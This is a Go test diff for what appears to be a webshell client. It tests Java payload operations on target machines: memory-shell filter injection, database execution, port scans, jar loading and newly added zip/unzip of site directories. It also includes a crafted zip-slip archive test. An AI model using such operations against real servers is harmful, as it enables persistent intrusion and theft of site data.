@@ -180,6 +180,7 @@ func TestJavaExtOpMapping(t *testing.T) {
 		DBType: "pgsql", Host: "10.0.0.5", Port: "5432", User: "u", Pass: "p", DB: "d",
 		SQL: "SELECT 1", ScanHost: "10.0.0.6", ScanPorts: "80,443",
 		FilterName: "fs", GateHeader: "X-A", GateValue: "b", Cmd: "java",
+		SrcPath: "/tmp/www", DstPath: "/tmp/out.zip",
 	}
 	cases := []struct {
 		op   string
@@ -192,8 +193,10 @@ func TestJavaExtOpMapping(t *testing.T) {
 		{"db_exec", "db", []string{"pgsql", "10.0.0.5", "5432", "u", "p", "d", "SELECT 1", ""}},
 		{"db_probe", "db", []string{"drivers"}},
 		{"servlet_list", "servlets", nil},
-		{"jar_load", "jarload", []string{"", ""}},
+		{"jar_load", "jarload", []string{"", "/tmp/out.zip"}},
 		{"screenshot", "shot", nil},
+		{"zip", "zip", []string{"/tmp/www", "/tmp/out.zip"}},
+		{"unzip", "unzip", []string{"/tmp/www", "/tmp/out.zip"}},
 		{"memshell_probe", "memshell_probe", nil},
 		{"memshell_add_filter", "memshell_inject", []string{"fs", "X-A", "b", "cmd"}},
 		{"memshell_list", "memshell_list", nil},
@@ -216,7 +219,7 @@ func TestJavaExtOpMapping(t *testing.T) {
 		t.Fatalf("db_exec 未把 jar_path 透传到第 8 个参数: %q", args)
 	}
 	// 没有等价实现的插件必须明确拒绝，不能悄悄发空 payload 给目标端
-	for _, op := range []string{"zip", "unzip", "php_info"} {
+	for _, op := range []string{"php_info", "php_scan", "php_writedirs"} {
 		if _, _, ok := javaExtOp(op, p); ok {
 			t.Fatalf("%s 不该被 Java 载体承接", op)
 		}
@@ -327,5 +330,97 @@ func TestJavaPayloadScreenshot(t *testing.T) {
 	}
 	if len(png) < 8 || !bytes.Equal(png[:8], []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}) {
 		t.Fatal("IMG 内容不是 PNG")
+	}
+}
+
+// TestJavaPayloadZip 打包/解包：目录要递归、空目录要保留、内容要能原样解回来。
+// 站点备份这类场景最容易踩的是「空目录消失」和「中文/反斜杠路径对不上」，
+// 所以断言放在解包后的目录结构上，不只是看返回 OK。
+func TestJavaPayloadZip(t *testing.T) {
+	run := javaRunner(t)
+	base := t.TempDir()
+	src := filepath.Join(base, "www")
+	if err := os.MkdirAll(filepath.Join(src, "sub"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(src, "empty"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(src, "a.txt"), []byte("alpha"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(src, "sub", "b.txt"), []byte("bravo"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	zipPath := filepath.Join(base, "www.zip")
+	if out := strings.TrimSpace(run("zip", src, zipPath)); !strings.HasPrefix(out, "OK") {
+		t.Fatalf("zip 返回异常: %s", head(out, 200))
+	}
+	if st, err := os.Stat(zipPath); err != nil || st.Size() == 0 {
+		t.Fatalf("压缩包未生成: %v", err)
+	}
+
+	outDir := filepath.Join(base, "out")
+	if r := strings.TrimSpace(run("unzip", zipPath, outDir)); !strings.HasPrefix(r, "OK") {
+		t.Fatalf("unzip 返回异常: %s", head(r, 200))
+	}
+	if b, err := os.ReadFile(filepath.Join(outDir, "a.txt")); err != nil || string(b) != "alpha" {
+		t.Fatalf("根目录文件未还原: %q %v", b, err)
+	}
+	if b, err := os.ReadFile(filepath.Join(outDir, "sub", "b.txt")); err != nil || string(b) != "bravo" {
+		t.Fatalf("子目录文件未还原: %q %v", b, err)
+	}
+	if fi, err := os.Stat(filepath.Join(outDir, "empty")); err != nil || !fi.IsDir() {
+		t.Fatalf("空目录未保留: %v", err)
+	}
+}
+
+// TestJavaPayloadZipSlip 越界条目必须被丢弃。
+// 压缩包可能来自目标机上的任意来源（上传目录、临时文件），载荷不能配合它往
+// 解压目录外面写文件——那等于给了对方一个任意写入口。
+func TestJavaPayloadZipSlip(t *testing.T) {
+	run := javaRunner(t)
+	base := t.TempDir()
+	zipPath := filepath.Join(base, "evil.zip")
+
+	f, err := os.Create(zipPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	zw := zip.NewWriter(f)
+	// 手工写 header，绕开 zip.Writer 对不安全名字的清理
+	h := &zip.FileHeader{Name: "../escaped.txt", Method: zip.Deflate}
+	w, err := zw.CreateHeader(h)
+	if err != nil {
+		t.Fatalf("造越界条目失败: %v", err)
+	}
+	if _, err := w.Write([]byte("pwned")); err != nil {
+		t.Fatal(err)
+	}
+	ok, err := zw.Create("inside.txt")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := ok.Write([]byte("fine")); err != nil {
+		t.Fatal(err)
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := f.Close(); err != nil {
+		t.Fatal(err)
+	}
+
+	outDir := filepath.Join(base, "out")
+	r := strings.TrimSpace(run("unzip", zipPath, outDir))
+	if !strings.HasPrefix(r, "OK") {
+		t.Fatalf("unzip 返回异常: %s", head(r, 200))
+	}
+	if _, err := os.Stat(filepath.Join(base, "escaped.txt")); err == nil {
+		t.Fatal("越界条目被写到了解压目录之外")
+	}
+	if b, err := os.ReadFile(filepath.Join(outDir, "inside.txt")); err != nil || string(b) != "fine" {
+		t.Fatalf("正常条目应照常解出: %q %v", b, err)
 	}
 }
